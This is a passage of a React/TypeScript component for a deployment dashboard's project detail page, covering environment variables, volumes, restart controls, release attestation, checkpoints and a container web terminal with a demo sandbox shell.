import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  Settings,
  LayoutGrid,
  ScrollText,
  Globe,
  Variable,
  Play,
  Square,
  Moon,
  Trash2,
  ShieldAlert,
  Database,
  Server,
  Copy,
  Eye,
  EyeOff,
  Plus,
  Search,
  Upload,
  Save,
  CheckCircle2,
  Box,
  Cpu,
  Webhook,
  Check,
  RefreshCw,
  Zap,
  Power,
  Rocket,
  ArrowLeft,
  Activity,
  PauseCircle,
  MoreHorizontal,
  FolderOpen,
  KeyRound,
  Loader2,
  X,
  Layers,
  FileCode2,
  ChevronDown,
  ChevronUp,
  ShieldCheck,
  Terminal,
  Cpu as CpuIcon,
  History,
  GitCompare,
  Wrench,
  Send,
  Gauge,
} from 'lucide-react';
import {
  api,
  type Project,
  type SmartPackPlanResult,
  type ReleaseAttestationResult,
  type AttestationVerifyResult,
  type MigrationPlanResult,
  type WasmInvokeResult,
  type TimeMachineCheckpoint,
  type TimeMachineRestoreResult,
  type ShadowReplayReport,
  type BuildHealerDiagnosis,
  type BuildHealerApplyResult,
  type ProjectDriftResult,
  type SloCanaryRollout,
  type WorkerAutoscalerPolicy,
  type WorkerAutoscalerEvaluation,
  type OomForensicsResult,
  type ImageBloatAuditResult,
  type EgressAuditResult,
  type MultiArchVerifyResult,
  type MultiArchPlanResult,
  type ChaosGameDayResult,
  type FeatureFlagRecord,
  type FeatureFlagEvalResult,
  type RuntimeAnomalyInspectResult,
  type DigestPromotionActionResult,
  type ApiContractDiffResult,
} from '../lib/api';
import { isDemoMode } from '../lib/demoMode';
import { liveEvents } from '../lib/liveEvents';
import { copyToClipboard } from '../lib/clipboard';
import { useI18n } from '../lib/i18n';
import { LiveLogs } from './LiveLogs';
import { DomainManager } from './DomainManager';
import { DatabasesPanel } from './DatabasesPanel';
import { DeploymentsPanel } from './DeploymentsPanel';
import { LiveForgePanel } from './LiveForgePanel';
import { Modal } from './Modal';
import { HelpTip } from './HelpTip';

type ProjectTabId = 'general' | 'live' | 'deployments' | 'logs' | 'domains' | 'databases' | 'storage' | 'vars' | 'config';

function normalizeProjectTab(raw?: string | null): ProjectTabId {
  if (!raw) return 'general';
  const map: Record<string, ProjectTabId> = {
    general: 'general',
    live: 'live',
    sync: 'live',
    deploy: 'deployments',
    deployments: 'deployments',
    logs: 'logs',
    domains: 'domains',
    databases: 'databases',
    db: 'databases',
    storage: 'storage',
    vars: 'vars',
    env: 'vars',
    config: 'config',
    settings: 'config',
  };
  return map[raw.toLowerCase()] || 'general';
}

interface ProjectDetailProps {
  projectId: string;
  initialTab?: string | null;
  onTabChange?: (tab: string) => void;
  onBack: () => void;
  onNotify: (msg: string, type?: 'info' | 'success' | 'error') => void;
  onProjectUpdate?: () => void;
  onOpenCatalog?: () => void;
  onOpenBackupSettings?: () => void;
  incomingLog?: any;
}

type EnvRow = { key: string; value: string; id: string };

function envObjectToRows(envVars?: Record<string, string>): EnvRow[] {
  return Object.entries(envVars || {}).map(([k, v], i) => ({
    key: k,
    value: String(v ?? ''),
    id: `row_${i}_${k}`,
  }));
}

function envRowsToText(rows: EnvRow[]): string {
  return rows
    .filter((r) => r.key.trim())
    .map((r) => `${r.key.trim()}=${r.value}`)
    .join('\n');
}

function parseRawEnv(raw: string): Record<string, string> {
  const out: Record<string, string> = {};
  const lines = raw.replace(/\r\n?/g, '\n').split('\n');
  for (const rawLine of lines) {
    const trimmed = rawLine.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;
    const match = trimmed.match(/^(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)$/);
    if (!match) continue;
    const key = match[1];
    let val = match[2];
    if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
      val = val.slice(1, -1);
    }
    out[key] = val;
  }
  return out;
}

export const ProjectDetail: React.FC<ProjectDetailProps> = ({
  projectId,
  initialTab,
  onTabChange,
  onBack,
  onNotify,
  onProjectUpdate,
  onOpenCatalog,
  onOpenBackupSettings,
  incomingLog,
}) => {
  const { t, locale } = useI18n();
  const [envSavedPendingRestart, setEnvSavedPendingRestart] = useState(false);
  const [fastRestarting, setFastRestarting] = useState(false);
  const [lastFastRestart, setLastFastRestart] = useState<{ durationMs: number | null } | null>(null);
  const [smartPackOpen, setSmartPackOpen] = useState(false);
  const [smartPackPlan, setSmartPackPlan] = useState<SmartPackPlanResult | null>(null);
  const [smartPackLoading, setSmartPackLoading] = useState(false);
  const [smartPackError, setSmartPackError] = useState<string | null>(null);
  const [smartPackShowIgnore, setSmartPackShowIgnore] = useState(false);
  const [smartPackShowDockerfile, setSmartPackShowDockerfile] = useState(false);
  const [smartPackCopied, setSmartPackCopied] = useState<'ignore' | 'dockerfile' | null>(null);

  // Cycle-5..13 Cockpit Panels (SLSA, Migrations, Micro-Wasm, Time-Machine, Shadow Replay, Terminal, Auto-Healer, Drift Check, SLO Canary, Autoscaler, Forensics)
  const [activeCockpit, setActiveCockpit] = useState<'slsa' | 'migration' | 'wasm' | 'timemachine' | 'shadow' | 'terminal' | 'healer' | 'drift' | 'canary' | 'autoscaler' | 'forensics' | null>(null);
  const [slsaAttest, setSlsaAttest] = useState<ReleaseAttestationResult | null>(null);
  const [slsaVerify, setSlsaVerify] = useState<AttestationVerifyResult | null>(null);
  const [slsaLoading, setSlsaLoading] = useState(false);
  const [slsaError, setSlsaError] = useState<string | null>(null);
  const [slsaCopied, setSlsaCopied] = useState(false);

  const [migCommand, setMigCommand] = useState('npx prisma migrate deploy');
  const [migPlan, setMigPlan] = useState<MigrationPlanResult | null>(null);
  const [migLoading, setMigLoading] = useState(false);
  const [migError, setMigError] = useState<string | null>(null);

  const [wasmResult, setWasmResult] = useState<WasmInvokeResult | null>(null);
  const [wasmLoading, setWasmLoading] = useState(false);
  const [wasmError, setWasmError] = useState<string | null>(null);

  const [tmCheckpoints, setTmCheckpoints] = useState<TimeMachineCheckpoint[]>([]);
  const [tmLoading, setTmLoading] = useState(false);
  const [tmCreating, setTmCreating] = useState(false);
  const [tmRestorePreview, setTmRestorePreview] = useState<TimeMachineRestoreResult | null>(null);
  const [tmError, setTmError] = useState<string | null>(null);

  const [shadowReport, setShadowReport] = useState<ShadowReplayReport | null>(null);
  const [shadowLoading, setShadowLoading] = useState(false);
  const [shadowError, setShadowError] = useState<string | null>(null);

  // Cycle-7 Web Terminal state (zero-dep WS /ws/terminal + interactive Sandbox shell)
  const [termShell, setTermShell] = useState<'/bin/sh' | '/bin/bash'>('/bin/sh');
  const [termConnected, setTermConnected] = useState(false);
  const [termConnecting, setTermConnecting] = useState(false);
  const [termError, setTermError] = useState<string | null>(null);
  const [termLines, setTermLines] = useState<string[]>([
    'Culkibo Zero-Dep Container Web Terminal · direct Docker Engine TCP hijack (/ws/terminal)',
    'Click "Connect Shell" to attach an interactive container session.',
  ]);
  const [termInput, setTermInput] = useState('');
  const [termHistory, setTermHistory] = useState<string[]>([]);
  const [termHistoryIdx, setTermHistoryIdx] = useState(-1);
  const termWsRef = useRef<WebSocket | null>(null);
  const termEndRef = useRef<HTMLDivElement | null>(null);

  // Cycle-7 Build Auto-Healer state (20-pattern deterministic classifier)
  const [healLogs, setHealLogs] = useState(
    'FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\nServer listening on http://127.0.0.1:3000'
  );
  const [healLoading, setHealLoading] = useState(false);
  const [healApplying, setHealApplying] = useState(false);
  const [healError, setHealError] = useState<string | null>(null);
  const [healDiagnosis, setHealDiagnosis] = useState<BuildHealerDiagnosis | null>(null);
  const [healApplyResult, setHealApplyResult] = useState<BuildHealerApplyResult | null>(null);

  // Cycle-8 Config Drift Detector state
  const [driftReport, setDriftReport] = useState<ProjectDriftResult | null>(null);
  const [driftLoading, setDriftLoading] = useState(false);
  const [driftError, setDriftError] = useState<string | null>(null);

  // Cycle-10 SLO Error-Budget Canary Auto-Rollback state
  const [canaryRollout, setCanaryRollout] = useState<SloCanaryRollout | null>(null);
  const [canaryBusy, setCanaryBusy] = useState<'load' | 'start' | 'advance' | 'spike' | 'abort' | null>(null);
  const [canaryError, setCanaryError] = useState<string | null>(null);

  // Cycle-12 KEDA Queue/Worker Autoscaler & Backpressure Breaker state
  const [autoPolicy, setAutoPolicy] = useState<WorkerAutoscalerPolicy>({
    minReplicas: 1,
    maxReplicas: 6,
    scaleUpQueueThreshold: 40,
    scaleDownQueueThreshold: 8,
    scaleUpCooldownSec: 60,
    scaleDownCooldownSec: 180,
    perReplicaRamMb: 384,
    reserveHostRamMb: 512,
    breakerQueueThreshold: 250,
    breakerRetryAfterSec: 15,
  });
  const [autoQueueDepth, setAutoQueueDepth] = useState('95');
  const [autoHostFreeRam, setAutoHostFreeRam] = useState('1600');
  const [autoEval, setAutoEval] = useState<WorkerAutoscalerEvaluation | null>(null);
  const [autoBusy, setAutoBusy] = useState<'load' | 'save' | 'eval' | null>(null);
  const [autoError, setAutoError] = useState<string | null>(null);

  // Cycle-13..16 OOM Forensics, Image Bloat, Egress Firewall, Multi-Arch, Chaos GameDay, Feature Flags, Runtime Anomaly, Digest Promotion & API Contract state
  const [forensicsTab, setForensicsTab] = useState<'oom' | 'image' | 'egress' | 'multiarch' | 'chaos' | 'flags' | 'anomaly' | 'promotion' | 'contract'>('oom');
  const [oomResult, setOomResult] = useState<OomForensicsResult | null>(null);
  const [oomBusy, setOomBusy] = useState(false);
  const [oomError, setOomError] = useState<string | null>(null);
  const [auditDockerfileText, setAuditDockerfileText] = useState(
    'FROM node:22-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\nFROM node:22-alpine\nUSER node\nWORKDIR /app\nCOPY --from=builder /app .\nCMD ["node", "server.js"]'
  );
  const [imageAuditResult, setImageAuditResult] = useState<ImageBloatAuditResult | null>(null);
  const [imageAuditBusy, setImageAuditBusy] = useState(false);
  const [imageAuditError, setImageAuditError] = useState<string | null>(null);
  const [egressResult, setEgressResult] = useState<EgressAuditResult | null>(null);
  const [egressBusy, setEgressBusy] = useState(false);
  const [egressError, setEgressError] = useState<string | null>(null);
  const [multiArchVerify, setMultiArchVerify] = useState<MultiArchVerifyResult | null>(null);
  const [multiArchPlan, setMultiArchPlan] = useState<MultiArchPlanResult | null>(null);
  const [multiArchBusy, setMultiArchBusy] = useState<'verify' | 'plan' | null>(null);
  const [multiArchError, setMultiArchError] = useState<string | null>(null);
  const [chaosResult, setChaosResult] = useState<ChaosGameDayResult | null>(null);
  const [chaosBusy, setChaosBusy] = useState<'prod' | 'abort' | 'healthy' | null>(null);
  const [chaosError, setChaosError] = useState<string | null>(null);

  // Cycle-15 Feature Flags, Runtime Anomaly & Immutable Digest Promotion state
  const [flagsList, setFlagsList] = useState<FeatureFlagRecord[]>([]);
  const [flagEval, setFlagEval] = useState<FeatureFlagEvalResult | null>(null);
  const [flagBusy, setFlagBusy] = useState<string | null>(null);
  const [flagError, setFlagError] = useState<string | null>(null);
  const [anomalyResult, setAnomalyResult] = useState<RuntimeAnomalyInspectResult | null>(null);
  const [anomalyBusy, setAnomalyBusy] = useState<'attack' | 'clean' | null>(null);
  const [anomalyError, setAnomalyError] = useState<string | null>(null);
  const [promoResult, setPromoResult] = useState<DigestPromotionActionResult | null>(null);
  const [promoBusy, setPromoBusy] = useState<'latest' | 'self' | 'sha' | null>(null);
  const [promoError, setPromoError] = useState<string | null>(null);
  // Cycle-16 API Contract & Schema Drift Gate state
  const [contractResult, setContractResult] = useState<ApiContractDiffResult | null>(null);
  const [contractBusy, setContractBusy] = useState<'breaking' | 'major' | null>(null);
  const [contractError, setContractError] = useState<string | null>(null);

  useEffect(() => {
    return () => {
      if (termWsRef.current) {
        try {
          termWsRef.current.close();
        } catch {
          // ignore
        }
        termWsRef.current = null;
      }
    };
  }, []);

  const [project, setProject] = useState<Project | null>(null);
  const [loadError, setLoadError] = useState<string | null>(null);
  const [activeTab, setActiveTabState] = useState<ProjectTabId>(() => normalizeProjectTab(initialTab));
  const [loading, setLoading] = useState(false);
  const [simulatingWebhook, setSimulatingWebhook] = useState(false);
  const [webhookProvider, setWebhookProvider] = useState<'github' | 'gitlab' | 'gitea' | 'bitbucket' | 'deploy_hook'>('github');
  const [rotatingHook, setRotatingHook] = useState(false);
  const [moreMenuOpen, setMoreMenuOpen] = useState(false);
  const moreMenuRef = useRef<HTMLDivElement>(null);
  const [configDirty, setConfigDirty] = useState(false);

  const setActiveTab = useCallback((next: ProjectTabId) => {
    setActiveTabState(next);
    onTabChange?.(next);
  }, [onTabChange]);

  const [prevInitialTab, setPrevInitialTab] = useState(initialTab);
  if (initialTab !== prevInitialTab) {
    setPrevInitialTab(initialTab);
    if (initialTab) setActiveTabState(normalizeProjectTab(initialTab));
  }

  useEffect(() => {
    if (!moreMenuOpen) return;
    const onDown = (e: MouseEvent) => {
      if (moreMenuRef.current && !moreMenuRef.current.contains(e.target as Node)) setMoreMenuOpen(false);
    };
    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setMoreMenuOpen(false);
    };
    document.addEventListener('mousedown', onDown);
    document.addEventListener('keydown', onKey);
    return () => {
      document.removeEventListener('mousedown', onDown);
      document.removeEventListener('keydown', onKey);
    };
  }, [moreMenuOpen]);

  const [copiedUrl, setCopiedUrl] = useState(false);
  const [copiedSecret, setCopiedSecret] = useState(false);
  const [showSecret, setShowSecret] = useState(false);

  const [envMode, setEnvMode] = useState<'table' | 'raw'>('table');
  const [envText, setEnvText] = useState('');
  const [envRows, setEnvRows] = useState<EnvRow[]>([]);
  const [showValues, setShowValues] = useState<Record<string, boolean>>({});
  const [searchVar, setSearchVar] = useState('');
  const envFileInputRef = useRef<HTMLInputElement>(null);

  const [showVolumeForm, setShowVolumeForm] = useState(false);
  const [volForm, setVolForm] = useState({ name: '', mount_path: '/data', host_path: '' });
  const [showMountForm, setShowMountForm] = useState(false);
  const [mountForm, setMountForm] = useState({ mount_path: '/etc/app/config.json', content: '', chmod: '644' });

  const [showDeleteDialog, setShowDeleteDialog] = useState(false);
  const [confirmDeleteName, setConfirmDeleteName] = useState('');
  const [deleting, setDeleting] = useState(false);

  const [prevProjectId, setPrevProjectId] = useState(projectId);
  const lastEnvJsonRef = useRef<string>('');
  const reqIdRef = useRef(0);
  const [togglingMaintenance, setTogglingMaintenance] = useState(false);

  if (prevProjectId !== projectId) {
    setPrevProjectId(projectId);
    setProject(null);
    setLoadError(null);
  }

  const syncEnvState = useCallback((envVars?: Record<string, string>) => {
    const rows = envObjectToRows(envVars);
    lastEnvJsonRef.current = JSON.stringify(envVars || {});
    setEnvRows(rows);
    setEnvText(envRowsToText(rows));
  }, []);

  const fetchProject = useCallback(async () => {
    const myReq = ++reqIdRef.current;
    try {
      setLoadError(null);
      const found = await api.getProject(projectId);
      if (myReq !== reqIdRef.current) return;
      if (found) {
        setProject(found);
        syncEnvState(found.envVars);
      }
    } catch (e: any) {
      if (myReq !== reqIdRef.current) return;
      setLoadError(e?.message || 'No se pudo cargar el proyecto');
    }
  }, [projectId, syncEnvState]);

  useEffect(() => {
    let active = true;
    const myReq = ++reqIdRef.current;
    api.getProject(projectId)
      .then((found) => {
        if (!active || myReq !== reqIdRef.current || !found) return;
        setProject(found);
        setLoadError(null);
        syncEnvState(found.envVars);
      })
      .catch((e: any) => {
        if (active && myReq === reqIdRef.current) setLoadError(e?.message || 'Proyecto no encontrado');
      });
    return () => { active = false; };
  }, [projectId, syncEnvState]);

  useEffect(() => {
    return liveEvents.onProjectChange((ev) => {
      const updated = ev.project;
      if (ev.action === 'update' && updated && updated.id === projectId) {
        setProject(updated);
        const nextEnv = JSON.stringify(updated.envVars || {});
        if (lastEnvJsonRef.current !== nextEnv) {
          syncEnvState(updated.envVars);
        }
      } else if (ev.action === 'deleted' && ev.id === projectId) {
        onBack();
      }
    });
  }, [projectId, onBack, syncEnvState]);

  const switchEnvMode = (nextMode: 'table' | 'raw') => {
    if (nextMode === envMode) return;
    if (nextMode === 'raw') {
      setEnvText(envRowsToText(envRows));
    } else {
      const parsed = parseRawEnv(envText);
      setEnvRows(envObjectToRows(parsed));
    }
    setEnvMode(nextMode);
  };

  const handleImportEnvFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const content = String(reader.result || '');
      setEnvText(content);
      setEnvRows(envObjectToRows(parseRawEnv(content)));
      setEnvMode('raw');
      onNotify(`Archivo ${file.name} cargado. Pulsa «Guardar variables» para aplicarlo.`, 'info');
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const handleAddVolume = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!project || !volForm.name.trim() || !volForm.mount_path.trim()) return;
    try {
      const nextVolumes = [
        ...(project.volumes || []),
        {
          name: volForm.name.trim(),
          mount_path: volForm.mount_path.trim(),
          host_path: volForm.host_path.trim() || undefined,
        },
      ];
      await api.updateProject(projectId, { volumes: nextVolumes });
      setVolForm({ name: '', mount_path: '/data', host_path: '' });
      setShowVolumeForm(false);
      onNotify('Volumen persistente guardado', 'success');
      void fetchProject();
    } catch (err: any) {
      onNotify(err?.message || 'Error al añadir volumen', 'error');
    }
  };

  const handleRemoveVolume = async (index: number) => {
    if (!project) return;
    const nextVolumes = (project.volumes || []).filter((_, i) => i !== index);
    try {
      await api.updateProject(projectId, { volumes: nextVolumes });
      onNotify('Volumen eliminado', 'info');
      void fetchProject();
    } catch (err: any) {
      onNotify(err?.message || 'Error al eliminar volumen', 'error');
    }
  };

  const handleAddFileMount = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!project || !mountForm.mount_path.trim()) return;
    try {
      const nextMounts = [
        ...(project.fileMounts || []),
        {
          mount_path: mountForm.mount_path.trim(),
          content: mountForm.content,
          chmod: mountForm.chmod.trim() || '644',
        },
      ];
      await api.updateProject(projectId, { fileMounts: nextMounts });
      setMountForm({ mount_path: '/etc/app/config.json', content: '', chmod: '644' });
      setShowMountForm(false);
      onNotify('Archivo montado guardado', 'success');
      void fetchProject();
    } catch (err: any) {
      onNotify(err?.message || 'Error al añadir archivo montado', 'error');
    }
  };

  const handleRemoveFileMount = async (index: number) => {
    if (!project) return;
    const nextMounts = (project.fileMounts || []).filter((_, i) => i !== index);
    try {
      await api.updateProject(projectId, { fileMounts: nextMounts });
      onNotify('Archivo montado eliminado', 'info');
      void fetchProject();
    } catch (err: any) {
      onNotify(err?.message || 'Error al eliminar archivo montado', 'error');
    }
  };

  const handleSimulatePush = async () => {
    if (!project) return;
    setSimulatingWebhook(true);
    try {
      const res = await api.testProjectWebhook(project.id);
      onNotify(res.message || 'Prueba de webhook ejecutada correctamente', 'success');
      void fetchProject();
    } catch (e: any) {
      onNotify(e?.message || 'Error al probar el webhook', 'error');
    } finally {
      setSimulatingWebhook(false);
    }
  };

  if (loadError) {
    return (
      <div className="bg-white border border-slate-200 rounded-xl p-8 max-w-lg mx-auto text-center space-y-4">
        <h2 className="text-base font-semibold text-slate-900">No se pudo cargar el proyecto</h2>
        <p className="text-xs text-slate-500">{loadError}</p>
        <div className="flex items-center justify-center gap-2">
          <button
            type="button"
            onClick={onBack}
            className="px-3.5 py-2 rounded-lg text-xs font-medium border border-slate-200 text-slate-700 hover:bg-slate-50 cursor-pointer"
          >
            Volver a proyectos
          </button>
          <button
            type="button"
            onClick={() => void fetchProject()}
            className="px-3.5 py-2 rounded-lg text-xs font-medium bg-slate-900 text-white hover:bg-slate-800 cursor-pointer"
          >
            Reintentar
          </button>
        </div>
      </div>
    );
  }

  if (!project) {
    return <div className="p-10 text-center text-xs text-slate-500">Cargando proyecto…</div>;
  }

  const previewHost = typeof window !== 'undefined' ? window.location.hostname : 'localhost';

  const handleStop = async () => {
    setLoading(true);
    try {
      await api.stopProject(projectId);
      await fetchProject();
      onNotify('Proyecto detenido y puerto liberado', 'info');
      onProjectUpdate?.();
    } catch (e: any) {
      onNotify(e?.message || 'Error al detener el proyecto', 'error');
      await fetchProject();
    } finally {
      setLoading(false);
    }
  };

  const handleHibernate = async () => {
    setLoading(true);
    try {
      await api.hibernateProject(projectId);
      await fetchProject();
      onNotify('Proyecto hibernado correctamente', 'info');
      onProjectUpdate?.();
    } catch (e: any) {
      onNotify(e?.message || 'Error al hibernar el proyecto', 'error');
      await fetchProject();
    } finally {
      setLoading(false);
    }
  };

  const handleStart = async () => {
    setLoading(true);
    try {
      await api.startLocal(projectId);
      await fetchProject();
      onNotify('Proyecto iniciado en local', 'success');
      onProjectUpdate?.();
    } catch (e: any) {
      onNotify(e?.message || 'Error al iniciar en local', 'error');
      await fetchProject();
    } finally {
      setLoading(false);
    }
  };

  const handleActivate = async () => {
    setLoading(true);
    try {
      await api.activateProject(projectId);
      await fetchProject();
      onNotify('Proyecto marcado como activo', 'success');
      onProjectUpdate?.();
    } catch (e: any) {
      onNotify(e?.message || 'Error al activar el proyecto', 'error');
      await fetchProject();
    } finally {
      setLoading(false);
    }
  };

  const handleSaveEnvRaw = async () => {
    const newVars = parseRawEnv(envText);
    try {
      await api.updateProject(projectId, { envVars: newVars });
      setEnvSavedPendingRestart(true);
      setLastFastRestart(null);
      onNotify(locale === 'es' ? 'Variables de entorno guardadas' : 'Environment variables saved', 'success');
      await fetchProject();
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Error saving env vars';
      onNotify(msg, 'error');
    }
  };

  const handleSaveEnvTable = async () => {
    const newVars: Record<string, string> = {};
    for (const r of envRows) {
      if (r.key.trim()) newVars[r.key.trim()] = r.value;
    }
    try {
      await api.updateProject(projectId, { envVars: newVars });
      setEnvSavedPendingRestart(true);
      setLastFastRestart(null);
      onNotify(locale === 'es' ? 'Variables de entorno guardadas' : 'Environment variables saved', 'success');
      await fetchProject();
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Error saving env vars';
      onNotify(msg, 'error');
    }
  };

  const handleFastRestart = async () => {
    setFastRestarting(true);
    try {
      const res = await api.fastRestartProject(projectId);
      const durationMs = typeof res.durationMs === 'number' ? res.durationMs : null;
      setEnvSavedPendingRestart(false);
      setLastFastRestart({ durationMs });
      const msLabel = durationMs !== null
        ? (durationMs >= 1000 ? `${(durationMs / 1000).toFixed(1)}s` : `${Math.round(durationMs)}ms`)
        : '~1.5s';
      onNotify(t('pd.fastRestartDone', { ms: msLabel }), 'success');
      await fetchProject();
      onProjectUpdate?.();
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Fast restart unavailable';
      onNotify(msg, 'error');
    } finally {
      setFastRestarting(false);
    }
  };

  const handleDelete = async () => {
    if (confirmDeleteName.trim() !== project.name) return;
    setDeleting(true);
    try {
      await api.deleteProject(projectId);
      onNotify('Proyecto eliminado', 'info');
      onBack();
    } catch (e: any) {
      onNotify(e?.message || 'Error al eliminar el proyecto', 'error');
      setDeleting(false);
    }
  };

  const copyValue = async (text: string, message = 'Copiado al portapapeles') => {
    const ok = await copyToClipboard(text);
    onNotify(ok ? message : 'No se pudo copiar al portapapeles', ok ? 'success' : 'error');
  };

  const domainCount = (project.domains || []).length;
  const dbCount = (project.linkedDatabaseIds || []).length;
  const envCount = Object.keys(project.envVars || {}).length;

  const envIsDirty = (() => {
    const currentObj: Record<string, string> = {};
    if (envMode === 'table') {
      for (const r of envRows) {
        if (r.key.trim()) currentObj[r.key.trim()] = r.value;
      }
    } else {
      Object.assign(currentObj, parseRawEnv(envText));
    }
    return JSON.stringify(currentObj) !== JSON.stringify(project.envVars || {});
  })();

  const handleLoadSmartPack = async () => {
    setSmartPackLoading(true);
    setSmartPackError(null);
    try {
      const plan = await api.getSmartPackPlan({ projectId: project.id });
      setSmartPackPlan(plan);
    } catch (e: unknown) {
      setSmartPackError(e instanceof Error ? e.message : 'SmartPack plan unavailable');
    } finally {
      setSmartPackLoading(false);
    }
  };

  const handleToggleSmartPack = () => {
    const next = !smartPackOpen;
    setSmartPackOpen(next);
    if (next && !smartPackPlan && !smartPackLoading) {
      void handleLoadSmartPack();
    }
  };

  const handleSignAndVerifySlsa = async () => {
    setSlsaLoading(true);
    setSlsaError(null);
    try {
      const rev = project.lastDeployedAt ? `rev-${Date.parse(project.lastDeployedAt).toString(36)}` : 'rev-current';
      const att = await api.attestProjectRelease(project.id, rev, {
        builderId: 'https://culkibo.dev/smartpack/v1',
      });
      setSlsaAttest(att);
      const ver = await api.verifyReleaseAttestation(att.envelope);
      setSlsaVerify(ver);
    } catch (e: unknown) {
      setSlsaError(e instanceof Error ? e.message : 'SLSA attestation unavailable');
    } finally {
      setSlsaLoading(false);
    }
  };

  const handlePlanMigration = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!migCommand.trim()) return;
    setMigLoading(true);
    setMigError(null);
    try {
      const plan = await api.planProjectMigration(project.id, migCommand.trim());
      setMigPlan(plan);
    } catch (e: unknown) {
      setMigError(e instanceof Error ? e.message : 'Migration plan error');
    } finally {
      setMigLoading(false);
    }
  };

  const handleTestWasm = async () => {
    setWasmLoading(true);
    setWasmError(null);
    try {
      const res = await api.invokeProjectWasm(project.id, { smokeTest: true, arg: 200 });
      setWasmResult(res);
    } catch (e: unknown) {
      setWasmError(e instanceof Error ? e.message : 'Micro-Wasm invocation error');
    } finally {
      setWasmLoading(false);
    }
  };

  const handleLoadTimeMachine = async () => {
    setTmLoading(true);
    setTmError(null);
    try {
      const res = await api.listTimeMachine(project.id);
      setTmCheckpoints(res.checkpoints || []);
    } catch (e: unknown) {
      setTmError(e instanceof Error ? e.message : 'Time-Machine unavailable');
    } finally {
      setTmLoading(false);
    }
  };

  const handleCreateCheckpoint = async () => {
    setTmCreating(true);
    setTmError(null);
    try {
      const cp = await api.createTimeMachineCheckpoint(project.id, {
        label: `Manual checkpoint (${new Date().toLocaleTimeString(locale === 'es' ? 'es-ES' : 'en-US')})`,
      });
      setTmCheckpoints((prev) => [cp, ...prev.filter((x) => x.id !== cp.id)]);
      onNotify(`Time-Machine checkpoint ${cp.id} captured`, 'success');
    } catch (e: unknown) {
      setTmError(e instanceof Error ? e.message : 'Could not create checkpoint');
    } finally {
      setTmCreating(false);
    }
  };

  const handleDryRunRestore = async (checkpointId: string) => {
    setTmLoading(true);
    setTmError(null);
    try {
      const res = await api.restoreTimeMachineCheckpoint(project.id, checkpointId, { dryRun: true });
      setTmRestorePreview(res);
    } catch (e: unknown) {
      setTmError(e instanceof Error ? e.message : 'Dry-run restore failed');
    } finally {
      setTmLoading(false);
    }
  };

  const handleRunShadowReplay = async () => {
    setShadowLoading(true);
    setShadowError(null);
    try {
      const originFallback = typeof window !== 'undefined' ? window.location.origin : 'http://127.0.0.1:4000';
      const baselineUrl = project.citadelPort
        ? `http://127.0.0.1:${project.citadelPort}`
        : (project.forgePort ? `http://127.0.0.1:${project.forgePort}` : originFallback);
      const candidateUrl = project.forgePort
        ? `http://127.0.0.1:${project.forgePort}`
        : baselineUrl;
      const res = await api.runShadowReplay(project.id, {
        baselineUrl,
        candidateUrl,
        allowLoopback: true,
        requests: [{ method: 'GET', path: '/' }, { method: 'GET', path: '/health' }],
      });
      setShadowReport(res);
    } catch (e: unknown) {
      setShadowError(e instanceof Error ? e.message : 'Shadow Replay unavailable');
    } finally {
      setShadowLoading(false);
    }
  };

  const handleDisconnectTerminal = () => {
    if (termWsRef.current) {
      try {
        termWsRef.current.close();
      } catch {
        // ignore
      }
      termWsRef.current = null;
    }
    setTermConnected(false);
    setTermLines((prev) => [...prev, '[session disconnected]']);
  };

  const handleConnectTerminal = async () => {
    setTermConnecting(true);
    setTermError(null);
    try {
      const ticketRes = await api.issueTerminalTicket(project.id, {
        shell: termShell,
        cols: 120,
        rows: 28,
      });
      if (isDemoMode()) {
        setTermConnected(true);
        setTermLines([
          `Connected to ${ticketRes.containerName} (${ticketRes.shell}) · Sandbox interactive shell`,
          'Type "help", "ls", "env", "uptime", "uname -a", or "clear".',
        ]);
        return;
      }
      if (termWsRef.current) {
        try {
          termWsRef.current.close();
        } catch {
          // ignore
        }
      }
      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      const ws = new WebSocket(`${proto}//${window.location.host}${ticketRes.wsPath}`);
      termWsRef.current = ws;
      ws.onopen = () => {
        setTermConnected(true);
        setTermLines((prev) => [
          ...prev,
          `Attached ${ticketRes.containerName} via ${ticketRes.shell} (HMAC ticket verified)`,
        ]);
      };
      ws.onmessage = (ev) => {
        const text = typeof ev.data === 'string' ? ev.data : '';
        if (!text) return;
        const chunks = text.replace(/\r\n/g, '\n').split('\n');
        setTermLines((prev) => [...prev.slice(-240), ...chunks]);
      };
      ws.onerror = () => {
        setTermError('WebSocket terminal stream failed (verify container is running and Docker socket is reachable).');
      };
      ws.onclose = () => {
        setTermConnected(false);
        termWsRef.current = null;
      };
    } catch (e: unknown) {
      setTermError(e instanceof Error ? e.message : 'Could not open container terminal');
    } finally {
      setTermConnecting(false);
    }
  };

  const handleSendTerminalCmd = (e: React.FormEvent) => {
    e.preventDefault();
    const cmd = termInput.trim();
    if (!cmd) return;
    setTermHistory((prev) => [cmd, ...prev.slice(0, 39)]);
    setTermHistoryIdx(-1);
    setTermInput('');

    if (cmd === 'clear') {
      setTermLines([]);
      return;
    }

    if (isDemoMode() || !termWsRef.current || termWsRef.current.readyState !== WebSocket.OPEN) {
      const promptLine = `root@${project.name}:/app# ${cmd}`;
      let out: string[] = [];
      if (cmd === 'help') {
        out = ['Available sandbox commands: help, ls, ls -la, env, uptime, whoami, pwd, uname -a, ps, clear'];
      } else if (cmd === 'ls' || cmd === 'ls -la') {
        out = ['Dockerfile  package.json  next.config.mjs  src/  public/  node_modules/'];
      } else if (cmd === 'env') {
        out = Object.entries(project.envVars || { NODE_ENV: 'production', PORT: '3000' }).map(
